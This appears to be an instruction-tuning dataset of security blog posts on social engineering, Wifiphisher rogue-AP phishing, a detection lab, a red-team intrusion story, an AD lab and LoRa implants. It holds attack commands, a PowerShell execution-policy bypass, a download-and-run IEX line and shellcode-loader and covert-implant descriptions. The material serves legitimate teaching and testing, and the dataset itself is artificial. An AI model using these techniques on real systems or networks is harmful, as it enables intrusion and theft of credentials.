tactics were deployed with and without success Humans inherently tend to trust people and have compassion toward other individuals especially if they are having a rough time or appear to be in distress There are several other examples where BHIS has demonstrated this to be true One blog post that stands out is one by Carrie Roberts ww.blackhillsinfosec.com social-engineering-sometimes-easy Protections How do you protect yourself or employees from being a social engineering victim The following can help Verify the Source Take the time to verify where the communication is coming from and do not blindly trust unknown parties Did you get an email stating that you have a package on the way with a link when nothing was ordered Did you find a USB in the hallway and have the urge to plug it in to see what is on it Did the president of the company request sensitive information via an email message Verification of the source is as easy as directly contacting the source to validate the request or going directly to a website instead of trusting the link provided Inspection of emails Hovering over a link could identify a mismatch between the link and the targeted resource Spelling and grammar errors can be a good indication of a phishing attempt Consider using a spam filter If you cannot validate a QR code or get a QR code unexpectedly don't open it especially if it urges you to act immediately Ask Questions If you are suspicious of the source pertaining to phone calls or in person interactions Ask questions that only that person would know It might be as easy as asking how their vacation last week went when you know the co-worker didn't take vacation Ask for identification to confirm the legitimacy of the individual Validate any work orders or other paperwork by directly calling the individual responsible and not the number disclosed on the document Contact the originator out-of-band using internal corporate resources email phone chat etc Urgency If you get a sense of urgency do not act in haste Take the time to understand if it is urgent and verify the source by calling or going directly to the website Use another form of communication to validate the legitimacy of the request Controls Implementation of controls can help in instances where a social engineering attack is successful Include Multi-Factor Authentication where employees access corporate resources Require another employee to authorize sensitive tasks electronic transfer of funds Conditional Access Controls for corporate businesses where employees are only granted access to systems that are needed for their specific job title Training Perform periodic training of employees on identifying and knowing how to handle social engineering tactics This should include testing policy and procedures often through social engineering calls phishing and physical security engagements Conclusion Social engineering exploits human trust and is used for gaining initial access into an environment collecting sensitive data and or performing malicious activities such as defaming or damaging a corporation's reputation Training yourself and employees about what social engineering is and how to handle situations when they suspect that they are getting social engineered is essential My favorite customer quote after we conducted a physical security test is We have had the first-person shooter training and this experience was much better than that because it demonstrated that someone could gain access to our secure office without proper authorization We will always verify the identity of visitors due to this exercise Not because we were told to in a class but because we failed and who knows what you guys had in those backpacks"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Install and Perform Wi-Fi Attacks with Wifiphisher</title>\n<taxonomies>General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Jordan Drysdale, Wireless, How to, wifiphisher, wireless testing, wireless tools</taxonomies>\n<creation_date>Thu, 11 Apr 2024 15:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "tl dr Install Wifiphisher on Kali and run a basic attack This crappy little copy paste-able operation resulted in a functional Wifiphisher virtual environment on Kali as of January 22 2024 apt-get install -y libnl-3-dev libnl-genl-3-dev libssl-dev python3-virtualenv cd opt git clone ithub.com wifiphisher wifiphisher.git cd wifiphisher virtualenv -p python3 env source env bin activate python3 -m pip install ConfigParser git clone ithub.com wifiphisher roguehostapd.git cd opt wifiphisher roguehostapd python3 setup.py install cd opt wifiphisher python3 -m pip install six python3 -m pip install wifiphisher -e CORP-RETAIL -p wifi_connect -kB deactivate when done Two additional edits were made inside the rfkill.py file included with the Wifiphisher installation Both instances of the following were updated to write bytes instead of just write fout open dpath 'wb line 104 fout open dpath 'wb line 135 The Wifiphisher toolkit provides an operator some novel approaches for interrogating wireless networks and clients One of the most interesting and potentially beneficial attacks with Wifiphisher in this author's opinion is the coffee shop known beacons -kB attack which is similar to the Wi-Fi KARMA attack Here's some quick background on wireless clients and the KARMA attack Almost all operating systems will automatically attempt to reconnect to previously used wireless networks This is potentially dangerous and exploitable behavior These requests are sent from the client as part of a preferred network list PNL advertisement broadcast This is potentially dangerous and exploitable behavior The known beacons attack in Wifiphisher is similar to the Wi-Fi KARMA attack KARMA accepts the client's advertised list of preferred networks PNL KARMA then turns those into an SSID and hopes the client connects the -kB attack just advertises a lengthy list of common SSID names one by one Yes the list is configurable Wireless clients may auto-connect to the networks to which they've connected previously The next command and screenshot invokes Wifiphisher The invoke presents any connecting clients the wifi_connect phishing module wifiphisher -e CORP-RETAIL -p wifi_connect -kB The next screenshot repeats again after the attack Known Beacons Attack Invocation with Wifiphisher Of note here the initial command brings up the operator's console shown below The operator's console includes the SSID we cloned from the retail space CORP-RETAIL and presented to clients as an open network The console also includes some of the known networks from the attacker's list SFO FREE WIFI FREE WIFI Hotel blah Established client connections also show up here Also of interest once a Windows client has connected we see that client attempting connections to windowsupdate.com and msftconnecttest.com The request for a text file here is likely part of the client's algorithm to decide whether it has a valid and fully established internet connection Finally as shown in the previous and next screenshots this victim submitted data to the phishing page Operator's Console View of Wifiphisher Tool The client side of this attack at least a Windows client appears something like the following The client is presented with the phishing page and a JavaScript modal dialog box The box prompts the connected client for their CORP-RETAIL key to fully connect as a lure Inputs then show up in the console above Windows Client Perspective on Wifiphisher This is the same screenshot shown as captured at initial invocation and after tool shutdown The console also contains the victim input as listed in the wfphshr-wpa-password value Client Input Captured in Console I also reviewed this attack on a Mac client just for research purposes The broadcast network was slightly different but achieved the same impact The client was redirected to the Mac's user-agent identified version of the wifi_connect lure Wifiphisher's Version of an Apple User Agent String Captive Portal The client was identified on initial connection appropriately as iOS MacOS device Client inputs were captured as shown Apple Device Connection to Wifiphisher Access Point Thanks for reading Stay safe and use your powers for good and not evil -jd References ifiphisher.org ithub.com wifiphisher wifiphisher n.wikipedia.org wiki KARMA_attack ifiphisher.org ps wifi_connect"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>At Home Detection Engineering Lab for Beginners</title>\n<taxonomies>Blue Team, Guest Author, How-To, Detection, framework, homelab, mitre att&ck</taxonomies>\n<creation_date>Thu, 02 May 2024 15:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Niccolo Arboleda Guest Author Niccolo Arboleda is a cybersecurity enthusiast and student at the University of Toronto He is usually found in his home lab studying different cybersecurity tools and working on projects He is passionate about defending critical infrastructure from cyber-attacks There are always new and evolving threats that target our environments It is essential to detect these threats before they cause actual harm to people and their livelihoods In this blog we will cover how to build a simple Security Information and Event Management SIEM environment to simulate attacks and give us an understanding of how vital detection is in identifying threats and creating defenses against them Links to all the software used and relevant documentation will be in the references section at the end of the blog If you get stuck at one point or another please refer to the documentation You will find solutions to your issues there Setting Up the Environment We will need the host machine your computer a hypervisor a manager server and an endpoint to build the environment The Hypervisor The first thing we need to do is pick a hypervisor on which to build our environment A hypervisor is software that allows us to create virtual machines using our host machine It is useful in this kind of scenario because we won't need multiple physical computers to create the environment There are many hypervisors but in terms of accessibility and ease of use the free versions of VMware Workstation or VirtualBox will do just fine The hypervisor I used for this project is VirtualBox The Manager Server We will use Wazuh as our manager server as it is open-source and well supported Wazuh is a platform used for threat detection and incident response There are other open-source SIEM solutions such as The ELK Stack or OSSEC if you would like to explore other options In this instance I recommend using the OVA version to simplify your installation process The OVA version is a standalone Linux Amazon Linux 2 virtual machine image with the Wazuh server already installed I hosted the server inside VirtualBox While the documentation section of the Wazuh website will have instructions on installation there is a high level overview in the below section Search installation alternatives and click on the Virtual Machine OVA link Download the image by clicking on the wazuh-4.7.3.ova sha512 link please note the version may have changed Once the image is downloaded click the import button on VirtualBox and load the file Before starting the virtual machine we will need to go to settings and change the display setting to VMSVGA to prevent the virtual machine from crashing as outlined in the Wazuh documentation Once we have the manager server up and running we will need to take note of its IP address using the ipconfig command so we can load the dashboard later The Endpoint The endpoint will have three main parts which are the operating system the agent and the attack-simulation framework Note the agent and framework will be installed on the endpoint virtual machine not the host machine Operating System Windows will be used as the operating system for the endpoint virtual machine The first step is to go to the Windows developer environment webpage and get a virtual machine that aligns with our hypervisor Once the image is downloaded it needs to be imported into VirtualBox like the Wazuh server manager We will select Import and select the Windows VirtualBox instance Next the virtual machine needs to be started You do not need a license in order to have a functional Windows virtual machine The Agent The installation instructions can be found in the Wazuh documentation Once downloaded install the Agent and run the manager Use the IP address of the manager server to configure the Wazuh agent and save the setting To check that everything is in order go back to your host machine and open a browser Input https and it should let you access the dashboard Your endpoint machine should show under agents outlined in the image below Attack-Simulation Framework In order to complete a detection lab we need a framework to reference cyber attacks to our specific environment In this case we will be using the MITRE ATT CK framework The MITRE ATT CK framework is a knowledge base of adversary techniques and tactics that are observed in the real world To simulate attacks on the endpoint we will be using Invoke-Atomic Atomic Red Team has a repository of detection tests based on the MITRE ATT CK framework Invoke-Atomic is the PowerShell module of Atomic Red Team This tool helps to aid cybersecurity professionals in understanding as well as simulating relevant threats in their environment To install Invoke-Atomic we will need to bypass PowerShell execution policies that might prevent the installation In this case I ran a PowerShell command under Administrator that disables the execution policy by replacing the Authorization Manager function Disable-ExecutionPolicy ctx executioncontext.gettype .getfield _context nonpublic instance .getvalue executioncontext .gettype .getfield _authorizationManager nonpublic instance .setvalue ctx new-object System.Management.Automation.AuthorizationManager Microsoft.PowerShell Disable-ExecutionPolicy .runme.ps1 Then I ran the installation command for both Invoke Atomic and its framework IEX IWR 'aw.githubusercontent.com redcanaryco invoke-atomicredteam master install-atomicredteam.ps1 -UseBasicParsing Install-AtomicRedTeam getAtomics The screenshot below shows a successful installation Attack Simulation Using Invoke-Atomic Once all the components are in place and running We can start simulating attacks on the endpoint to see what alerts will be triggered by the attack simulations A simulation can be run through PowerShell The command I used is Invoke-AtomicTest T1003 -TestNumbers 6 In this specific example I used the attack reference T1003 6 as shown below which is a credential dumping attack utilizing kmgr.dll and rund1132.exe Credential Dumping is an online attack that steals credentials typically from random access memory RAM Upon starting the simulation the following application Stored User Names and Passwords is triggered The Wazuh dashboard also registered activity from the attack stating changes in the registry values and key integrity The rules 750 Registry Value Integrity Checksum Changed and 594 Registry Key Integrity Changed were recorded for further analysis They can be found on the Security Event tab in the Wazuh dashboard It is important to note that not all attack simulations will yield an alert This is not necessarily a bad thing since it identifies a gap that can be filled in the detection system You can also consider combining alerts that do appear to make your own custom detections Summary Building our environment executing attack simulations and seeing if any alerts appear on the dashboard can help us begin identifying gaps in our detections and tuning our SIEM to lower the noise and bring the relevant alerts to a higher level in the system This is where your detection engineering adventure begins As a final note I want to say that the field of cybersecurity is vast and many disciplines are involved Don't be discouraged if you are new to the industry and genuinely passionate about defending people from ever-increasing technological threats We're on this journey together and I am rooting for you Resources ww.virtualbox.org ocumentation.wazuh.com current deployment-options virtual-machine virtual-machine.html ww.microsoft.com en-ca software-download windows11 ocumentation.wazuh.com current installation-guide wazuh-agent index.html ithub.com redcanaryco invoke-atomicredteam wiki ithub.com redcanaryco invoke-atomicredteam wiki Execute-Atomic-Tests Local ttack.mitre.org"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Red Teaming: A Story From the Trenches</title>\n<taxonomies>Informational</taxonomies>\n<creation_date>Thu, 18 Apr 2024 17:08:53 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "This article originally featured in the very first issue of our PROMPT zine Choose Wisely You can find that issue and all the others here ww.blackhillsinfosec.com prompt-zine I remember a day when a customer now a friend bragged that the deployed application allowlisting policies at his organization were highly secure thorough and well vetted Naturally I asked about the process he undertook to create such a thing My friend replied We started by considering all of the Microsoft Windows operating systems and applications to be hostile Everything was blocked and we built from the ground up I have to say that I was intrigued How many organizations would live through the pain of application allowlisting on steroids an approach that blocked everything and then selectively allowed only what is needed including the operating system itself For a little context we have had a relationship with our friend for a number of years At the start of our customer relationship this person asked the right questions In response we literally posed Do you want to take the red pill or the blue pill He chose red and began a program to build some of the most robust defenses that he possibly could Zoom forward a few years into this relationship and we graduated to a full-blown red team exercise as many in our industry would think appropriate Coming into the red teaming exercise I and my teammate Ethan had decided that we really wanted to gain physical access to the organization and implant a command channel on the first machine we encountered We began our preparations in earnest and reached the point of considering what command channel we wanted to implant What could we do There was no possibility of running any binary content any visual basic scripts macros PowerShell and or commands on these systems We knew just how much the program had developed and had been locked down hard To give a little more context we are speaking of running our operations in early 2017 A lot of the current application allowlisting bypasses that are fairly widely published now were not really public knowledge As I was researching around the internet for application allowlisting bypasses I came across a few Twitter posts from subTee and having encountered some of his materials before began to get interested in the techniques that were published mostly as GitHub gists What caught my attention was an attack that leveraged the REGSVR32.EXE binary which in turn would load the Windows scripting runtime DLL named scrobj.dll to execute a block of Jscript This attack became well recognized by the moniker SquiblyDoo around that same time period From my perspective though I found the need to fetch a script object from an external resource to be unnecessary so I decided to modify the attack I authored some code I later called WEvade I am not good at names which used the same technique as SquiblyDoo but implemented in a custom DLL that did not attempt to interpret any form of script Instead the attack read the required shellcode from a file or web server and directly executed base64-encoded shellcode contained within that file or URL After we tested and ensured that the custom malware would successfully evade the antivirus solutions and application allowlisting we began preparing for our physical incursion Between Ethan and I we geared up with a Bash Bunny and a USB stick as backup just in case the Bash Bunny failed for any reason The Bash Bunny is a fun hacker gadget that has a small Debian Linux installation on it and can present itself as USB storage or a human keyboard interface device for the express delivery of malware payloads Finally the day had arrived for our adventure Ethan and I nervously pulled up to a parking meter of the street next to the target organization premises We both had all of the gear in hand and cellular modems for communications to the command channel infrastructure In these situations there is always that nervous sort of moment when you have the discussion that goes along the lines of Ok who is going to attempt to enter the premises and do the nerve-wracking part of the work I managed to convince Ethan to do that part of the exercise so he grabbed his bag and set out for the lobby As it turns out this was a multi-tenant and multi-floor building so Ethan literally picked someone who looked like and employee that might work at the organization and followed them into the elevator Later we discovered that Ethan had actually hitched a ride up the elevator with the company CEO making small talk all the way up Ethan quickly found that getting off at the correct floor allowed him direct access to the organization so he walked casually into the door and found the nearest computer workstation immediately whipping out the Bash Bunny and plugging it in Ethan then discovered that the organization's policies did not allow human interface-style devices to be connected so he reverted to a USB storage method He also had trouble with this mechanism and began getting very nervous as he was an unknown face messing around with a computer workstation in a pretty open office setting The following SMS transaction between us then transpired whereby Ethan asked me to quickly deploy a web server with the payload files on it The funniest part of the entire SMS transaction is when I realized that Ethan did not just want a web server but a web server with the payload files on it I have been accused of being too literal in the past This time it was along the lines of anxiety-driven stupidity See the SMS right here Ethan It's giving me index.html Joff Yes that's right You want something else Ethan definitely must have thought I had either lost my mind completely or was playing a really poorly-timed joke Near hysterical and rapid pace red teamer SMS exchange in the heat of battle It worked We got a command channel fully operational and I did my customary root dance in the driver seat of my rental vehicle downstairs As we later in the day were regaling our success celebrating mightily that we had bested the application allowlisting deployment our point of contact and friend told us that he almost succeeded in stopping us Of course we were feeling pretty cocky by that time and asked how that could be possible I mean we had won that first hurdle of gaining a foothold As it so happens our customer had an interesting solution deployed that detected whenever any USB storage device was connected to one of his workstations The defense solution had indeed done its job and alerted the system administrator in his office that an unknown USB device had been connected to this workstation Being very security conscious the alerted system administrator made his way upstairs to the workstation cubicle area to find out what was going on As he was on his way he needed a quick bathroom break by which time Ethan had already succeeded and had hightailed his way out of the office pronto Amusingly Ethan even ran into the system administrator on his way out giving quick eye contact and trying to continue looking casual while leaving the scene I suppose that the moral of the story is that When you gotta go well you just gotta go right Who would have known that a penetration tester aka threat actor had just run in the door and dropped a malware payload only to exit stage left and somehow completely avoid revealing his purpose by virtue of lucky timing As was also discovered later it was fortuitous that Ethan even found an unoccupied workstation without the screen being locked So ends this tale from the Red Teaming trenches where by a combination of skill and sheer luck we bested the people process and technology literally by seconds and of course had a great deal of fun and laughs afterwards"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Deploy an Active Directory Lab Within Minutes</title>\n<taxonomies>Alyssa Snow, External/Internal, General InfoSec Tips & Tricks, How-To, Informational</taxonomies>\n<creation_date>Thu, 25 Apr 2024 15:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Creating your own lab can sound like a daunting task By the end of this blog post you will be able to deploy your own Active Directory AD environment in minutes All you will need is a browser to access your lab environment so you can do your AD R D Research Development anytime anywhere Snap Labs Snap Labs1 is a platform that simplifies building and managing lab environments It can be used to create cyber ranges for training or Research Development R D The Snap Labs platform is owned by Immersive Labs2 and is used by security training organizations such as Zero Point Security.3 Prerequisites What You Will Need Internet access A web browser An AWS account4 How to Sign Up To sign up for Snap Labs navigate to ashboard.snaplabs.io signup Once you sign up for Snap Labs you will be asked to provide details about your AWS account Immersive Labs Register Snap Labs deploys lab infrastructure in AWS using the credentials that you provide it You can view the Cloud Formation stack used by Snap Labs in AWS by selecting the SnapLabsManagement link on the settings page AWS Account Information in Snap Labs An example of the SnapLabsManagement dashboard in AWS CloudFormation is shown below Snap Labs Management Cloud Formation Events If you are curious about the templates used to build the underlying lab infrastructure you can review the CloudFormation template used by selecting Template View CloudFormation Template Range Templates Once you've set up your account Snap Labs lets you create a range based off existing templates or build from scratch to create your own range lab environment Select Create new range in the Ranges page Create a Range Snap Labs provides several Range Templates that are available by default To view these templates select Range Templates in the side bar Available Default Templates To view details about an existing template click on the template name This will display a basic description network diagram and an estimated running cost Estimated Running Cost of Splunk Attack Range Deploy Introduction Active Directory Lab Let's get started by launching the AD Quick Start 2019 range To launch a range based off a template select the rocket ship button Active Directory Template This will redirect the browser to a form where you can enter the range name and description Set Name and Description Next you will see your range pop up in your Ranges page To interact with the lab select Manage Ranges Running The AD Quickstart 2019 template has a domain controller a Windows server and an admin machine The admin machine serves as a jump box from the attacker machine to the internal network lab network Once all three systems display the green Running icon your lab is ready to go Don't be alarmed if this takes a few minutes AD Lab Running The user credentials for each system can be found under Edit Credentials Edit tab located in the system settings Credentials for RDP User VPN Access to Range Snap Labs allows you to configure various VPN configurations for various access roles in the lab environment To create your VPN configuration file select the access type and operating system Then you can download the VPN configuration and connect from your system via RDP SSH VPN Configuration Browser-based Access to Range To connect to your lab environment via the browser navigate to the target system and click Connect in the Snap Labs UI Connect to Domain Controller After you click connect another tab will open with a remote desktop session You can copy paste in the guacamole instance which is super useful especially when you want to run a long command Browser-based Connection to Domain Controller Now you've successfully deployed your very own Active Directory environment In the next section we will cover some neat features you may want to take advantage of to customize your lab environment Customize Your Cyber Range When a new range is created a basic Readme is generated Each template provided by Snap Labs also contains a Readme Readme for AD Quickstart 2019 Template As you customize your environment you can modify the Readme to help you document your newly created lab environment A diagram is built automatically for each range The network diagram of the AD Quickstart 2019 template is shown in the figure below Network Diagram When you add new systems to your range the diagram will automatically update To add a new system go to Systems New Systems Select New System Next specify the system details As shown in the figure below there are various operating systems to select from ranging from Microsoft Windows to Kali Linux Add System You can alternatively use a custom image by specifying the AMI as shown in the figure below Add Image via Custom AMI Similar to AWS Security Groups you can configure basic inbound outbound network rules via the Settings Subnets tab Configure Inbound Rules You can configure your own DNS name in DHCP settings DHCP Settings You can take snapshots of a single system in your lab environment or snapshot the entire lab which can be helpful while you experiment if you want to revert to a previous state Snap Shots Something important to note is the Auto-Off feature You can set this option in the General settings If you are anything like me you may start building a lab begin hacking away then something shiny pops up You get distracted close out your window or walk away and you totally forget about the running lab To avoid unnecessary AWS bills you can set the Auto-Off feature which will suspend your lab when you are inactive This will stop the running instances but will not destroy the lab infrastructure which means that charges may accrue despite turning off the lab Auto-Off Setting From the Settings General tab you can save the changes made to your Range and power it down to use later or delete the range if you no longer wish to use it Save Delete Range Settings Now you've set up your very own Active Directory environment that you can build upon destroy and redeploy as you wish Templatize Your Range So now that you've set up your lab environment let's save the range as a template so you can easily relaunch and build upon it in the future Create a Template Once you've created your template you can share it privately by specifying individual emails or you can make the template public To share your range simply select the range and scroll to the Sharing section to create a shareable link Create Shareable Link By creating a publicly shareable link anyone who can view the link will have access to your Range Template to deploy using their own account Once a range has been shared you cannot revoke access Please review the following message from Immersive Labs before creating a publicly shareable template Public Template Warning from Immersive Labs For more information about Snap Labs check out the documentation ocs.snaplabs.io docs getting-started Summary In this blog post we accomplished the following Created a Snap Labs Account Explored some of Snap Labs features Launched our very own Active Directory Cyber Range Created a cyber range template which can be used to deploy an Active Directory lab environment that can be shared with others Footnotes"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Offensive IoT for Red Team Implants - Part 1</title>\n<taxonomies>Hardware Hacking, Physical, Red Team, Red Team Tools, Tim Fowler</taxonomies>\n<creation_date>Thu, 09 May 2024 15:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "This is part one of a multipart blog series on researching a new generation of hardware implants and how using solutions from the world of IoT can unleash new capabilities Background Back in April 2023 I took a deep dive into the state of cybersecurity in space systems One of the initial goals of the effort was to learn as much as I could and then build something that others could play with hands on to get their first taste of how things in space work That goal was actualized at Wild West Hacking Fest in October of 2023 where two 1u CubeSats1 were deployed for attendees to work through a guided lab that mimicked real world threats to space systems Why am I telling you this Well as part of the development process for the CubeSat labs I knew fundamentally the success or failure of the effort was dependent on having a solid bi-directional communication system that allowed for not only being able to receive telemetry data from the CubeSats but most importantly also allowed for telecommands to be issued remotely without physically being connected to the CubeSat Ultimately I settled on an implementation that leveraged LoRa Long Range 2 modulation because it was relatively affordable operated in a US ISM Band of 915Mhz thus not requiring any specialized RF circuitry or license to operate and avoided the grossly over-crowded 2.4GHz portion of the spectrum For the CubeSats themselves I used a commercially available breakout board that used a RFM95 LoRa module and it worked well However for the ground station side of the equation I could not just plug one of the breakout boards into a computer so I ended up developing a custom PCB that utilized the same RFM95 LoRa module as the commercial option but also included a Raspberry Pi Pico W to control the module and interface with a computer It all worked the labs were a success but again why is this important Well let's dive in 0x01 Hardware Right before the 2023 holiday season I conversed with a friend regarding possible practical applications of the CubeSat research Thinking about the various details of the CubeSat project it did not take very long before I really homed in on the foundational element that made it possible communications Specifically command and control of a remote system over LoRa That was it that was the key I knew there would be a way to pivot from CubeSats to figuring out how to use the communication channel for offensive purposes Like most projects I start I just dove in headfirst without even as much as a quick Google search to see if anyone else had done or was doing what I was thinking about YOLO dev am I right For the rest of this post I am going to focus on the hardware only I may mention some software aspects but I will not be going into detail about any software specifics beyond functionality and capabilities Do not fret though part two of this series will be focused on the software and implementations so stayed tuned If you remember in the background section I ended up creating a custom PCB to facilitate PC to LoRa module communication Well that was the result but it started here It actually started on a breadboard but this was what came next a PCB with a Raspberry Pi Pico W and Adafruit RFM95 LoRa module soldered using through-hole header pins to the PCB Unpopulated Through-Hole PCBs First Iteration of a Pico-LoRa Board This setup worked well for my testing purposes and there really was nothing wrong with it other than the cost was higher than I wanted it to be with it being about 32 USD give or take per board Eventually after multiple failed PCB designs I ended up with a PCB that used surface mount components and reduced the cost to about 14 USD per board and I got to learn all about PCB design and fabrication win-win Completed Pico-LoRa PCB in Acrylic Case Cool so we have hardware now what I am so glad you asked First we need a little primer on LoRa LoRa short for long range is a spread spectrum modulation technique derived from chirp spread spectrum CSS technology Semtech's LoRa is a long range low power wireless platform that has become the de facto wireless platform of Internet of Things IoT ww.semtech.com lora what-is-lora I am not going to bore you with the details of chirps and what not but what you really need to know is that LoRa is a low-bandwidth communication that can traverse much greater distances than say traditional Wi-Fi in the 2.4 or 5.8GHz bands of the spectrum NOTE 802.11ah Halow is the exception here Range should be more or less the same given the same output power Now imagine bolting on the ability to communicate with a device over LoRa instead of using the more ubiquitous Wi-Fi options typically used when it comes to physical implant devices Are you with me I am not going to name any specific physical implant devices but you know the type of devices I am talking about Those that will emulate keyboards and mouse inputs automatically run commands and scripts as well as other attacks most automagically upon the device being connected to a host computer This class of physical implant device works well but there are some limitations you must account for when using them The biggest limitation is around control of the device itself With most of the common implant devices out there there are basically a couple of options for being able to control the implant device The first method would be to have a device to use the host computer's internet connection and traverse that to a web service where control commands can be issued and sent back to the device This often can work but there is no guarantee Then there is a similar option of having the device join an open Wi-Fi network and backhauling command and control traffic via that network Again this works but is reliant on the presence of an open network There is also the option of using Bluetooth to be able to connect to the device as a C2 channel but Bluetooth is limited range and in some cases the presence of a new Bluetooth device in the environment can be an instant indicator that something is afoot The same thing could be said for using the device to host a wireless network that as an operator you would connect to in order to initiate control of the device but it suffers the same issues as Bluetooth in terms of limited range and potential detection LoRa enters from stage left By utilizing LoRa-based communication for command-and-control capabilities of a physical implant device many of the limitations and potential points of detection are eliminated For instance many mature organizations have robust wireless intrusion preventions solutions that can detect a rogue access point or even rogue Bluetooth device How many people have even thought about detecting LoRa much less actually implemented a method for doing so Unlike other IoT protocols like Zigbee and X-bee that primarily operate in the 2.4GHz spectrum which is heavily populated and in some cases monitored the 915 MHz band used by LoRa is largely unmonitored especially from a rogue device perspective By simply augmenting the existing communication options with current day physical implants with a LoRa-based solution the likelihood of detection on the airwaves goes down considerably You may be asking yourself Couldn't you just monitor the airwaves for LoRa devices and that would be a great question to ask The answer is yes you can BUT it is not as simple as that First LoRa is a proprietary modulation scheme that requires physical hardware to be able to use it That also means you need to have physical hardware that understands the modulation of LoRa to listen to it You can use software-defined radio devices like the RTL-SDR or HackRF to pick up on the potential presence of LoRa communications by looking for the characteristic chirps but that is about it You will not be able to demodulate it as of now and really will not have any more context to what is happening other than that something is happening Here is the kicker though Remember how LoRa has become the de facto wireless platform of Internet of Things IoT Well that is a very true statement and there is very likely a device using LoRa within range of where you are reading this from Everything from power and gas meters to proliferation of smart devices are using LoRa to communicate There are entire global-wide area networks WANs built using LoRa and subsequent LoRaWAN protocols to carry data to and from the internet from IoT devices Even if you are able to detect the presence of a rogue LoRa device within your environment you are going to have an uphill battle of isolating communication and being able to see what data is being sent over this out-of-band channel Assuming you can identify the traffic you would need to configure a LoRa radio module to the exact settings such as spreading factor SF coding rate CR and bandwidth to see the content of the data stream Then you would also need to brute force your way to determining the node address that data is being sent to luckily there are only 255 options Lastly if you are able to fine tune your radio with all these parameters you probably are going to be faced with encrypted data Again good luck You will be better off just trying to find the rogue device than trying to see the data stream Time to go fox hunting n.wikipedia.org wiki Transmitter_hunting Needless to say it can be very difficult to detect if a device is using LoRa much less a rogue device connected to one of your organization's assets Got it hard to detect with current tooling But why else should LoRa be used Again another fantastic question my reader friend The short but long pun answer is range I will not bore you with the physics of radio signal propagation in relationship to frequency but the ability to plant a device and then control it remotely without the need to be in close proximity to said device is kind of important Don't want to get caught hanging outside the secretary's office trying to run an attack right This is where LoRa can shine In July 2023 a new world record distance a LoRa communication traveled and was received was 830 miles ww.thethingsnetwork.org article new-lora-world-record-1336-km-830-mi Understand that is far from the norm but that is 4.3x increase of the world record Wi-Fi connection Using increase of 4.3x when compared to Wi-Fi is probably a little high for real world everyday experience but in my testing a 3x improvement of distance was pretty standard Now I did not in any way perform very scientific experiments to determine this but rather the 'crude drive down the road to see when the signal drops out method Your mileage will vary but in most normal cases the small LoRa modules with even a basic wire antenna is strong enough to have its signal escape out of the building into the parking lot and beyond With a device indoors I have been able control an implant device from close to 500 meters away Yay physics Let's recap physical implant device modified with LoRa module produces a long er range convert communication channel for controlling said implant Sweet It's been around 1000 words since I was talking about hardware so let's circle back to that The original testing used the PCBs I designed for the CubeSat lab which worked great for testing purposes and could reasonably be used in the field but due to the technical limitations of the Raspberry Pi Pico W such as lack of mass storage capability and not easily reprogrammed over-the-air I felt the need for a complimentary device with more capabilities and just a little more 'oomph if you will So here enters the next iteration of hardware implant What you see above is a pretty simple setup all based around a Raspberry Pi Zero W These tiny single board computers have been around for a long time now and there have been some incredible projects built using them for physical implants such as P4wnP1 ithub.com RoganDawes P4wnP1 Along with the Raspberry Pi Zero W there is an USB On-the-go OTG breakout board that allows you to mount the Pi Zero to it and in turn you get a full-size USB type A port that allows you to plug the entire device into a PC USB port to power the device and use the host connected to perform attacks such as keystroke and mouse click injection attacks and more Essentially it becomes a USB stick computer Here is the one I used for most of my testing ww.amazon.com dp B098JP79ZX?psc 1 ref ppx_yo2ov_dt_b_product_details I am a little embarrassed to say that I did not know these sorts of thing existed prior to jumping down this rabbit hole But they are incredibly simple PCB that use pogo pins or SMD spring contacts to contact the test points on the bottom of the Pi Zero So brilliant The last and frankly more crucial piece of the puzzle is adding the LoRa module to the device Luckily for us I stumbled across a design someone had made for let me check my notes yep you guessed it a Raspberry Pi Zero and a LoRa RMF95 module The details for the LoRaPi breakout board can be found here igitalconcepts.net.au pcbs index.php?op lorapi igitalconcepts.net.au pcbs content images 